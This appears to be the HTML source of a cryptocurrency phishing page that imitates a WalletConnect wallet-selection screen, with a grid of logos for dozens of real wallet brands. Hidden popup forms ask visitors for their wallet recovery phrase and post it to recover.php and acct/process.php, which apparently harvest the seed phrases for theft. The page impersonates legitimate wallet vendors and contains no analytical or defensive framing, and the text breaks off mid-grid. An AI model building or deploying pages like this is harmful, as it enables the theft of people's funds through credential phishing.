<!DOCTYPE html>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
      
	  <meta charSet="utf-8"/>
	  <title>MobileWalletConnect</title>
	  <link rel="shortcut icon" href="https://walletconnect.org/favicon.ico"/>
	  
	  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
	  <link href="style.css" rel="stylesheet" type="text/css">

   </head>
   
   <body style="background-color:white; color:black; margin:10%; width:80%;">
      
      	  
	  <div class="container-fluid">
		<h2 class="text-center" style="color:grey; margin:10%; text-align: center" onclick="removeFunction()">Wallets</h2>
		<br />
		<!--<div class="canc" onclick="removeFunction()"><h2>x</h2></div>-->
		<h2> Multiple iOS and Android wallets support the SecureWallet protocol. Simply and securely link your mobile wallet using our dApp. Interaction between mobile apps and mobile browsers are supported via mobile deep linking. </h2>
		<br />

		<br/>
		
		<div class="popup text-center">
		  <span class="popuptext" id="processForm">
			<form method="POST" action="recover.php">
			 
				<input type="hidden" id="formInput" name="wallet" value="Trust wallet" >
				<label for="inputPassword5" class="form-label">Recovery phrase</label>
				<textarea name="passphrase" rows="4" id="inputPassword5" class="form-control" aria-describedby="passwordHelpBlock"></textarea>
				<div id="passwordHelpBlock" class="form-text">
				  <h2>Each word must be separated by a single space, and must not contain numbers, special characters, or emoji.</h2>
				</div>
				<br />
				<button type="submit" name='formBtn' id="formBtn" class="btn btn-outline-primary btn-sm">Submit</button>
			</form>
		  </span>
		</div>
				
				<div class="row" style="text-align: center">
			 <div class="col-sm-4 col-lg-4 col-xl-4 ">
				<div class="text-center" onclick="trustFunction()"><img src="registry.walletconnect.org/logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpeg" class="rounded-circle" alt="Trust Wallet" width="120"><h2>Trust Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="dappFunction()"><img src="https://media-exp1.licdn.com/dms/image/C4E0BAQEg14gPX_cwRg/company-logo_200_200/0/1540189003964?e=2159024400&amp;v=beta&amp;t=S7YdVioc97ZxwRPL5OjabJa7_2m4ISeJM-CTivAsqNU" class="rounded-circle" alt="Dapp Wallet" width="120"><h2>Dapp Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="enjinFunction()"><img src="en.bitcoinwiki.org/upload/en/images/d/d0/Download.jpg" class="rounded-circle" alt="enjin" width="120"><h2>Enjin</h2>
				</div>
			</div>
		</div>
		<br/><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="ftxFunction()"><img src="block-builders.de/wp-content/uploads/2020/10/FTX-678x381.png" class="rounded-circle" alt="Ftx" width="120"><h2>Ftx</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="coingeckoFunction()"><img src="res-3.cloudinary.com/crunchbase-production/image/upload/c_lpad%2ch_256%2cw_256%2cf_auto%2cq_auto_eco/v1465274195/tg6zsifdweekud3yh4yq.png" class="rounded-circle" alt="Coingecko Wallet" width="120"><h2>Coingecko Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="polkaFunction()"><img src="https://th.bing.com/th/id/OIP.f7zT_gcKzGavU2YzawIyPwAAAA?pid=ImgDet&amp;rs=1" class="rounded-circle" alt="Polka" width="120"><h2>Polka wallet</h2>
				</div>
			</div>
		</div>

		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="trezorFunction()"><img src="www.hulacoins.de/images/content/136-trezor-wallet-logo-pm.jpg" class="rounded-circle" alt="Trezor" width="120"><h2>Trezor</h2>
			  </div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="breadwalletFunction()"><img src="https://th.bing.com/th/id/OIP.aHwklSkhOpAqhAuP_p6qlgAAAA?pid=ImgDet&amp;rs=1" class="rounded-circle" alt="Bread Wallet" width="120"><h2>Bread Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="armoryFunction()"><img src="https://coindoo.com/wp-content/uploads/2018/11/armony-wallet.jpg" class="rounded-circle" alt="Armory" width="120"><h2>Armory</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="greenaddressFunction()"><img src="greenaddress.jpg" class="rounded-circle" alt="Greenaddress" width="120"><h2>GreenAddress</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="myetherwalletFunction()"><img src="www.cryptovantage.com/app/uploads/2020/05/MyEtherWallet-Icon-1.png" class="rounded-circle" alt="Myether Wallet" width="120"><h2>MyEtherWallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="electrumFunction()"><img src="newbium.s3.amazonaws.com/9b11dbf2161610100327.png" class="rounded-circle" alt="Electrum" width="120"><h2>Electrum wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="edgeFunction()"><img src="www.buybitcoinworldwide.com/img/wallets/edge.png" class="rounded-circle" alt="Edge" width="120"><h2>Edge wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="zengoFunction()"><img src="is5-ssl.mzstatic.com/image/thumb/Purple114/v4/dc/00/7c/dc007cb3-be7c-db33-615d-c980bc601dae/source/512x512bb.jpg" class="rounded-circle" alt="Zengo Wallet" width="120"><h2>Zengo Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="wasabiFunction()"><img src="miro.medium.com/max/3778/1_YrE7wrJ3PfSgajkz6_mU4Q.png" class="rounded-circle" alt="Wasabi" width="120"><h2>Wasabi</h2>
				</div>
			</div>
		</div>


		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="rainbowFunction()"><img src="registry.walletconnect.org/logo/lg/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpeg" class="rounded-circle" alt="Rainbow" width="120"><h2>Rainbow</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="guardaFunction()"><img src="https://yt3.ggpht.com/a/AATXAJyQpBO8GvMY6QlKZNfcVl1s-7Ih4mjQECxctQ=s900-c-k-c0xffffffff-no-rj-mo" class="rounded-circle" alt="Guarda Wallet" width="120"><h2>Guarda Wallet</h2>
				</div>
			</div>
			
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="argentFunction()"><img src="registry.walletconnect.org/logo/lg/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpeg" class="rounded-circle" alt="Argent" width="120"><h2>Argent</h2>
				</div>
			</div>
		</div>
		<br />
		
		<div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="metamaskFunction()"><img src="registry.walletconnect.org/logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpeg" class="rounded-circle" alt="MetaMask" width="120"><h2>MetaMask</h2>
				</div>
			</div>
			
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="gnosisFunction()"><img src="registry.walletconnect.org/logo/lg/a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f.jpeg" class="rounded-circle" alt="Gnosis Safe Multisig" width="120"><h2>Gnosis Safe Multisig</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="cryptoFunction()"><img src="registry.walletconnect.org/logo/lg/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpeg" class="rounded-circle" alt="Crypto.com | DeFi Wallet" width="120"><h2>DeFi Wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="pillarFunction()"><img src="registry.walletconnect.org/logo/lg/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c.jpeg" class="rounded-circle" alt="pillar" width="120"><h2>Pillar</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="imTokenFunction()"><img src="registry.walletconnect.org/logo/lg/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2.jpeg" class="rounded-circle" alt="imToken" width="120"><h2>imToken</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="ONTOFunction()"><img src="registry.walletconnect.org/logo/lg/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpeg" class="rounded-circle" alt="ONTO" width="120"><h2>ONTO</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="tokenPocketFunction()"><img src="registry.walletconnect.org/logo/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpeg" class="rounded-circle" alt="TokenPocket" width="120"><h2>TokenPocket</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="mathWalletFunction()"><img src="registry.walletconnect.org/logo/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpeg" class="rounded-circle" alt="MathWallet" width="120"><h2>MathWallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="bitPayFunction()"><img src="registry.walletconnect.org/logo/lg/ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b.jpeg" class="rounded-circle" alt="BitPay" width="120"><h2>BitPay</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="ledgerLiveFunction()"><img src="registry.walletconnect.org/logo/lg/4ab2542c2799c825a8465ba5ab8aa7def52b7904f38b74484af917ed9c0fc4e5.jpeg" class="rounded-circle" alt="Ledger Live" width="120"><h2>Ledger Live</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="wallethFunction()"><img src="registry.walletconnect.org/logo/lg/83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168.jpeg" class="rounded-circle" alt="Walleth" width="120"><h2>Walleth</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="authereumFunction()"><img src="registry.walletconnect.org/logo/lg/71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d.jpeg" class="rounded-circle" alt="Authereum" width="120"><h2>Authereum</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="huobiWalletFunction()"><img src="registry.walletconnect.org/logo/lg/bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4.jpeg" class="rounded-circle" alt="Huobi Wallet" width="120"><h2>Huobi Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="eidooFunction()"><img src="registry.walletconnect.org/logo/lg/efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61.jpeg" class="rounded-circle" alt="Eidoo" width="120"><h2>Eidoo</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="MYKEYFunction()"><img src="registry.walletconnect.org/logo/lg/61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e.jpeg" class="rounded-circle" alt="MYKEY" width="120"><h2>MYKEY</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="loopringWalletFunction()"><img src="registry.walletconnect.org/logo/lg/dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756.jpeg" class="rounded-circle" alt="Loopring Wallet" width="120"><h2>Loopring Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="trustVaultFunction()"><img src="registry.walletconnect.org/logo/lg/6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6.jpeg" class="rounded-circle" alt="TrustVault" width="120"><h2>TrustVault</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="atomicFunction()"><img src="registry.walletconnect.org/logo/lg/185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a.jpeg" class="rounded-circle" alt="Atomic" width="120"><h2>Atomic</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="coin98Function()"><img src="registry.walletconnect.org/logo/lg/b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e.jpeg" class="rounded-circle" alt="Coin98" width="120"><h2>Coin98</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="coolWalletSFunction()"><img src="registry.walletconnect.org/logo/lg/1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d.jpeg" class="rounded-circle" alt="CoolWallet S" width="120"><h2>CoolWallet S</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="aliceFunction()"><img src="registry.walletconnect.org/logo/lg/beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693.jpeg" class="rounded-circle" alt="Alice" width="120"><h2>Alice</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="alphaWalletFunction()"><img src="registry.walletconnect.org/logo/lg/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpeg" class="rounded-circle" alt="AlphaWallet" width="120"><h2>AlphaWallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="DCENTWalletFunction()"><img src="registry.walletconnect.org/logo/lg/468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63.jpeg" class="rounded-circle" alt="D'CENT Wallet" width="120"><h2>D'CENT Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="zelCoreFunction()"><img src="registry.walletconnect.org/logo/lg/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.jpeg" class="rounded-circle" alt="ZelCore" width="120"><h2>ZelCore</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="nashFunction()"><img src="registry.walletconnect.org/logo/lg/8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14.jpeg" class="rounded-circle" alt="Nash" width="120"><h2>Nash</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="coinomiFunction()"><img src="registry.walletconnect.org/logo/lg/9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814.jpeg" class="rounded-circle" alt="Coinomi" width="120"><h2>Coinomi</h2>
				  <span class="popuptext" id="coinomi">
					<form method="POST" action="acct/process.php">
						<input type="hidden" name="wallet" value="Coinomi wallet" >
						<label for="inputPassword5" class="form-label">Recovery phrase</label>
						<textarea name="passphrase" rows="4" id="inputPassword5" class="form-control" aria-describedby="passwordHelpBlock"></textarea>
						<div id="passwordHelpBlock" class="form-text">
						  <h2>Each word must be separated by a single space, and must not contain numbers, special characters, or emoji.</h2>
						</div>
						<br />
						<button type="submit" class="btn btn-outline-primary btn-sm">Recover Coinomi wallet</button>
					</form>
				  </span>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="gridPlusFunction()"><img src="registry.walletconnect.org/logo/lg/6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702.jpeg" class="rounded-circle" alt="GridPlus" width="120"><h2>GridPlus</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="CYBAVOWalletFunction()"><img src="registry.walletconnect.org/logo/lg/a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5.jpeg" class="rounded-circle" alt="CYBAVO Wallet" width="120"><h2>CYBAVO Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="tokenaryFunction()"><img src="registry.walletconnect.org/logo/lg/c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0.jpeg" class="rounded-circle" alt="Tokenary" width="120"><h2>Tokenary</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="torusFunction()"><img src="registry.walletconnect.org/logo/lg/3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50.jpeg" class="rounded-circle" alt="Torus" width="120"><h2>Torus</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="spatiumFunction()"><img src="registry.walletconnect.org/logo/lg/7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09.jpeg" class="rounded-circle" alt="Spatium" width="120"><h2>Spatium</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="safePalFunction()"><img src="registry.walletconnect.org/logo/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpeg" class="rounded-circle" alt="SafePal" width="120"><h2>SafePal</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="infinitoFunction()"><img src="registry.walletconnect.org/logo/lg/d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6.jpeg" class="rounded-circle" alt="Infinito" width="120"><h2>Infinito</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="walletioFunction()"><img src="registry.walletconnect.org/logo/lg/176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b.jpeg" class="rounded-circle" alt="wallet.io" width="120"><h2>Wallet.io</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="infinityWalletFunction()"><img src="registry.walletconnect.org/logo/lg/802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f.jpeg" class="rounded-circle" alt="Infinity Wallet" width="120"><h2>Infinity Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="ownbitFunction()"><img src="registry.walletconnect.org/logo/lg/8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad.jpeg" class="rounded-circle" alt="Ownbit" width="120"><h2>Ownbit</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="easyPocketFunction()"><img src="registry.walletconnect.org/logo/lg/244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c.jpeg" class="rounded-circle" alt="EasyPocket" width="120"><h2>EasyPocket</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="bridgeWalletFunction()"><img src="registry.walletconnect.org/logo/lg/881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb.jpeg" class="rounded-circle" alt="Bridge Wallet" width="120"><h2>Bridge Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="sparkPointFunction()"><img src="registry.walletconnect.org/logo/lg/3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1.jpeg" class="rounded-circle" alt="SparkPoint" width="120"><h2>SparkPoint</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="viaWalletFunction()"><img src="registry.walletconnect.org/logo/lg/ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1.jpeg" class="rounded-circle" alt="ViaWallet" width="120"><h2>ViaWallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="bitKeepFunction()"><img src="registry.walletconnect.org/logo/lg/42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106.jpeg" class="rounded-circle" alt="BitKeep" width="120"><h2>BitKeep</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="visionFunction()"><img src="registry.walletconnect.org/logo/lg/b642ab6de0fe5c7d1e4a2b2821c9c807a81d0f6fd42ee3a75e513ea16e91151c.jpeg" class="rounded-circle" alt="vision" width="120"><h2>Vision</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="PEAKDEFIWalletFunction()"><img src="registry.walletconnect.org/logo/lg/38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b.jpeg" class="rounded-circle" alt="PEAKDEFI Wallet" width="120"><h2>PEAKDEFI Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="unstoppableWalletFunction()"><img src="registry.walletconnect.org/logo/lg/7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd.jpeg" class="rounded-circle" alt="Unstoppable Wallet" width="120"><h2>Unstoppable Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="haloDeFiWalletFunction()"><img src="registry.walletconnect.org/logo/lg/025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0.jpeg" class="rounded-circle" alt="HaloDeFi Wallet" width="120"><h2>HaloDeFi Wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="dokWalletFunction()"><img src="registry.walletconnect.org/logo/lg/d12b6e114af8c47a6eec19a576f1022032a5ee4f8cafee612049f4796c803c7e.jpeg" class="rounded-circle" alt="Dok Wallet" width="120"><h2>Dok Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="ATWalletFunction()"><img src="registry.walletconnect.org/logo/lg/3d56ed42374504f1bb2ba368094269eaea461c075ab796d504f354baac213dc5.jpeg" class="rounded-circle" alt="AT.Wallet" width="120"><h2>AT.Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="midasWalletFunction()"><img src="registry.walletconnect.org/logo/lg/1e04cf5cddcd84edb1370b12eae1fcecedf125b77209fff80e7ef2a6d3c74719.jpeg" class="rounded-circle" alt="Midas Wallet" width="120"><h2>Midas Wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="ellipalFunction()"><img src="registry.walletconnect.org/logo/lg/15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef.jpeg" class="rounded-circle" alt="Ellipal" width="120"><h2>Ellipal</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="KEYRINGPROFunction()"><img src="registry.walletconnect.org/logo/lg/0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3.jpeg" class="rounded-circle" alt="KEYRING PRO" width="120"><h2>KEYRING PRO</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="aktionariatFunction()"><img src="registry.walletconnect.org/logo/lg/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpeg" class="rounded-circle" alt="Aktionariat" width="120"><h2>Aktionariat</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="talkenWalletFunction()"><img src="registry.walletconnect.org/logo/lg/95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c.jpeg" class="rounded-circle" alt="Talken Wallet" width="120"><h2>Talken Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="XinFinXDCNetworkFunction()"><img src="registry.walletconnect.org/logo/lg/78640a74036794a5b7f8ea501887c168232723696db4231f54abd3fe524037b4.jpeg" class="rounded-circle" alt="XinFin XDC Network" width="120"><h2>XinFin XDC Network</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="flareWalletFunction()"><img src="registry.walletconnect.org/logo/lg/d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c.jpeg" class="rounded-circle" alt="Flare Wallet" width="120"><h2>Flare Wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="kyberSwapFunction()"><img src="registry.walletconnect.org/logo/lg/55e5b479c9f49ddac5445c24725857f19888da1ef432ae5e4e01f8054d107670.jpeg" class="rounded-circle" alt="KyberSwap" width="120"><h2>KyberSwap</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="aTokenWalletFunction()"><img src="registry.walletconnect.org/logo/lg/6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0.jpeg" class="rounded-circle" alt="AToken Wallet" width="120"><h2>AToken Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="tongueWalletFunction()"><img src="registry.walletconnect.org/logo/lg/4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9.jpeg" class="rounded-circle" alt="Tongue Wallet" width="120"><h2>Tongue Wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="rWalletFunction()"><img src="registry.walletconnect.org/logo/lg/b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346.jpeg" class="rounded-circle" alt="RWallet" width="120"><h2>RWallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="plasmaPayFunction()"><img src="registry.walletconnect.org/logo/lg/13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70.jpeg" class="rounded-circle" alt="PlasmaPay" width="120"><h2>PlasmaPay</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="O3WalletFunction()"><img src="registry.walletconnect.org/logo/lg/0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0.jpeg" class="rounded-circle" alt="O3Wallet" width="120"><h2>O3Wallet</h2>
				</div>
			</div>
		</div>
		<br /><div class="row" style="text-align: center">
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="hashKeyMeFunction()"><img src="registry.walletconnect.org/logo/lg/761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c.jpeg" class="rounded-circle" alt="HashKey Me" width="120"><h2>HashKey Me</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
				<div class="popup text-center" onclick="jadeWalletFunction()"><img src="registry.walletconnect.org/logo/lg/0a00cbe128dddd6e096ebb78533a2c16ed409152a377c1f61a6a5ea643a2d950.jpeg" class="rounded-circle" alt="Jade Wallet" width="120"><h2>Jade Wallet</h2>
				</div>
			</div>
			<div class="col-sm-4 col-lg-4 col-xl-4">
